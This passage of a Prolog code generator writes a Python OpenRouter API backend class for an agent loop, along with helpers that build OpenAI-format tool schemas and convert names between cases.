    generate_backend_header(S, openrouter_api),
    %% Generate DEFAULT_TOOL_SCHEMAS from tool_spec/2 facts
    write(S, '# Default tool schemas for function calling (OpenAI format)\n'),
    write(S, 'DEFAULT_TOOL_SCHEMAS = [\n'),
    agent_loop_components:emit_tool_schemas_py(S, [target(python)]),
    write(S, ']\n\n\n'),
    generate_backend_class_decl(S, openrouter_api),
    write(S, '    def __init__(\n        self,\n        api_key: str | None = None,\n'),
    write(S, '        model: str | None = None,\n'),
    write(S, '        base_url: str = "https://openrouter.ai/api/v1",\n'),
    write(S, '        max_tokens: int = 4096,\n        temperature: float = 0.7,\n'),
    write(S, '        system_prompt: str | None = None,\n'),
    write(S, '        tools: list[dict] | None = None,\n    ):\n'),
    write(S, '        self.api_key = api_key\n'),
    write(S, '        self.model = model or \'moonshotai/kimi-k2.5\'\n'),
    write(S, '        self.base_url = base_url or \'https://openrouter.ai/api/v1\'\n'),
    write(S, '        self.max_tokens = max_tokens\n        self.temperature = temperature\n'),
    write(S, '        self.system_prompt = system_prompt or (\n'),
    write(S, '            "You are a helpful AI coding assistant. "\n'),
    write(S, '            "Answer questions directly and concisely. "\n'),
    write(S, '            "When asked to perform tasks, use the available tools."\n        )\n'),
    write(S, '        self.tool_schemas = tools\n\n'),
    write(S, '        if not self.api_key:\n            raise ValueError(\n'),
    write(S, '                "OpenRouter API key required. Set OPENROUTER_API_KEY, "\n'),
    write(S, '                "provide --api-key, or add api_key to uwsal.json / coro.json."\n            )\n\n'),
    generate_send_message_sig(S),
    write(S, '        """Send message to OpenRouter API."""\n'),
    write(S, '        on_status = kwargs.get(\'on_status\')\n\n'),
    write_py(S, messages_builder_openrouter),
    write(S, '\n        body = {\n            "model": self.model,\n'),
    write(S, '            "messages": messages,\n            "max_tokens": self.max_tokens,\n'),
    write(S, '            "temperature": self.temperature,\n        }\n\n'),
    write(S, '        if self.tool_schemas:\n            body["tools"] = self.tool_schemas\n'),
    write(S, '            body["tool_choice"] = "auto"\n\n'),
    write(S, '        url = f"{self.base_url.rstrip(\'/\')}/chat/completions"\n'),
    write(S, '        req_data = json.dumps(body).encode(\'utf-8\')\n\n'),
    write(S, '        req = Request(\n            url,\n            data=req_data,\n'),
    write(S, '            headers={\n                \'Content-Type\': \'application/json\',\n'),
    write(S, '                \'Authorization\': f\'Bearer {self.api_key}\',\n'),
    write(S, '                \'HTTP-Referer\': \'https://github.com/s243a/UnifyWeaver\',\n'),
    write(S, '                \'X-Title\': \'UnifyWeaver Agent Loop\',\n'),
    write(S, '            },\n            method=\'POST\'\n        )\n\n'),
    write(S, '        if on_status:\n            on_status("Waiting for response...")\n\n'),
    write(S, '        try:\n            with urlopen(req, timeout=300) as resp:\n'),
    write(S, '                data = json.loads(resp.read().decode(\'utf-8\'))\n'),
    write_py(S, error_handler_urllib),
    write(S, '\n        content = ""\n        tool_calls = []\n        tokens = {}\n\n'),
    write(S, '        if data.get(\'choices\'):\n            choice = data[\'choices\'][0]\n'),
    write(S, '            msg = choice.get(\'message\', {})\n\n'),
    write(S, '            content = msg.get(\'content\') or \'\'\n\n'),
    write(S, '            for tc in msg.get(\'tool_calls\', []):\n'),
    write(S, '                if tc.get(\'type\') == \'function\':\n'),
    write(S, '                    func = tc.get(\'function\', {})\n'),
    write(S, '                    try:\n'),
    write(S, '                        arguments = json.loads(func.get(\'arguments\', \'{}\'))\n'),
    write(S, '                    except json.JSONDecodeError:\n'),
    write(S, '                        arguments = {"raw": func.get(\'arguments\', \'\')}\n'),
    write(S, '                    tool_calls.append(ToolCall(\n'),
    write(S, '                        name=func.get(\'name\', \'\'),\n'),
    write(S, '                        arguments=arguments,\n'),
    write(S, '                        id=tc.get(\'id\', \'\')\n                    ))\n'),
    write(S, '                    if on_status:\n'),
    write(S, '                        desc = self._describe_tool_call(\n'),
    write(S, '                            func.get(\'name\', \'?\'), arguments)\n'),
    write(S, '                        on_status(f"[{len(tool_calls)}] {desc}")\n\n'),
    write(S, '        usage = data.get(\'usage\', {})\n        if usage:\n'),
    write(S, '            tokens = {\n                \'input\': usage.get(\'prompt_tokens\', 0),\n'),
    write(S, '                \'output\': usage.get(\'completion_tokens\', 0),\n'),
    write(S, '                \'total\': usage.get(\'total_tokens\', 0),\n            }\n\n'),
    write(S, '        return AgentResponse(\n            content=content,\n'),
    write(S, '            tool_calls=tool_calls,\n            tokens=tokens,\n'),
    write(S, '            raw=data\n        )\n\n'),
    write_py(S, supports_streaming_true, [backend_name='OpenRouter']),
    write(S, '\n'),
    write_py(S, sse_streaming_openrouter),
    write(S, '\n'),
    generate_describe_tool_call(S, openrouter_api),
    write(S, '\n'),
    write_py(S, name_property, [display_name='OpenRouter ({self.model})']).

%% =============================================================================
%% Tool Schema Generation (OpenAI function calling format)
%% =============================================================================

%% Generate a single tool schema entry in OpenAI format from tool_spec/2 facts
generate_tool_schema_py(S, ToolName, ToolProps) :-
    member(description(Desc), ToolProps),
    member(parameters(Params), ToolProps),
    write(S, '    {\n'),
    write(S, '        "type": "function",\n'),
    write(S, '        "function": {\n'),
    format(S, '            "name": "~w",~n', [ToolName]),
    format(S, '            "description": "~w",~n', [Desc]),
    write(S, '            "parameters": {\n'),
    write(S, '                "type": "object",\n'),
    write(S, '                "properties": {\n'),
    generate_tool_schema_properties(S, Params),
    write(S, '                },\n'),
    write(S, '                "required": ['),
    generate_tool_schema_required(S, Params),
    write(S, ']\n'),
    write(S, '            }\n'),
    write(S, '        }\n'),
    write(S, '    },\n').

generate_tool_schema_properties(_, []).
generate_tool_schema_properties(S, [param(Name, Type, _, Desc)]) :-
    format(S, '                    "~w": {~n', [Name]),
    format(S, '                        "type": "~w",~n', [Type]),
    format(S, '                        "description": "~w"~n', [Desc]),
    write(S, '                    }\n').
generate_tool_schema_properties(S, [param(Name, Type, _, Desc)|Rest]) :-
    Rest \= [],
    format(S, '                    "~w": {~n', [Name]),
    format(S, '                        "type": "~w",~n', [Type]),
    format(S, '                        "description": "~w"~n', [Desc]),
    write(S, '                    },\n'),
    generate_tool_schema_properties(S, Rest).

generate_tool_schema_required(_, []).
generate_tool_schema_required(S, [param(Name, _, required, _)]) :-
    format(S, '"~w"', [Name]).
generate_tool_schema_required(S, [param(Name, _, required, _)|Rest]) :-
    Rest \= [],
    format(S, '"~w", ', [Name]),
    generate_tool_schema_required(S, Rest).
generate_tool_schema_required(S, [param(_, _, Optional, _)|Rest]) :-
    Optional \= required,
    generate_tool_schema_required(S, Rest).

%% =============================================================================
%% Helper Predicates
%% =============================================================================

%% Resolve class name: use class_name/1 override if present, else auto-generate
resolve_class_name(Name, ClassName) :-
    agent_backend(Name, Props),
    (member(class_name(ClassName), Props) ->
        true
    ;
        backend_class_name(Name, ClassName)
    ).

%% Resolve file name: use file_name/1 override if present, else auto-generate
resolve_file_name(Name, FileName) :-
    agent_backend(Name, Props),
    (member(file_name(FN), Props) ->
        atom_string(FN, FNStr),
        atom_string(FileName, FNStr)
    ;
        backend_file_name(Name, FileName)
    ).

%% Auto-generate CamelCase class name from snake_case
backend_class_name(Name, ClassName) :-
    atom_codes(Name, Codes),
    to_camel_case(Codes, CamelCodes),
    atom_codes('Backend', BackendCodes),
    append(CamelCodes, BackendCodes, ClassCodes),
    atom_codes(ClassName, ClassCodes).

%% Auto-generate snake_case file name
backend_file_name(Name, FileName) :-
    atom_codes(Name, Codes),
    to_snake_case(Codes, SnakeCodes),
    atom_codes(FileName, SnakeCodes).

to_camel_case([], []).
to_camel_case([C|Rest], [Upper|CamelRest]) :-
    C >= 0'a, C =< 0'z,
    Upper is C - 32,
    to_camel_case_rest(Rest, CamelRest).
to_camel_case([C|Rest], [C|CamelRest]) :-
    to_camel_case_rest(Rest, CamelRest).

to_camel_case_rest([], []).
to_camel_case_rest([0'_|Rest], CamelRest) :-
    to_camel_case(Rest, CamelRest).
to_camel_case_rest([C|Rest], [C|CamelRest]) :-
    C \= 0'_,
    to_camel_case_rest(Rest, CamelRest).

to_snake_case([], []).
to_snake_case([C|Rest], [Lower|SnakeRest]) :-
    C >= 0'A, C =< 0'Z,
    Lower is C + 32,
    to_snake_case(Rest, SnakeRest).
to_snake_case([C|Rest], [C|SnakeRest]) :-
    to_snake_case(Rest, SnakeRest).

%% Convert Prolog true/false to Python True/False
py_bool(true, 'True').
py_bool(false, 'False').

%% Write a list of quoted strings for __all__
write_quoted_list(_, []).
write_quoted_list(S, [Item]) :-
    format(S, '    \'~w\',~n', [Item]).
write_quoted_list(S, [Item|Rest]) :-
    Rest \= [],
    format(S, '    \'~w\',~n', [Item]),
    write_quoted_list(S, Rest).

%% Query helpers for introspection
list_backends :-
    write('Available backends:'), nl,
    findall(Name-Desc, (agent_backend(Name, Props), member(description(Desc), Props)), Pairs),
    maplist([Name-Desc]>>(format('  ~w: ~w~n', [Name, Desc])), Pairs).

list_tools :-
    write('Available tools:'), nl,
    findall(Name-Desc, (tool_spec(Name, Props), member(description(Desc), Props)), Pairs),
    maplist([Name-Desc]>>(format('  ~w: ~w~n', [Name, Desc])), Pairs).
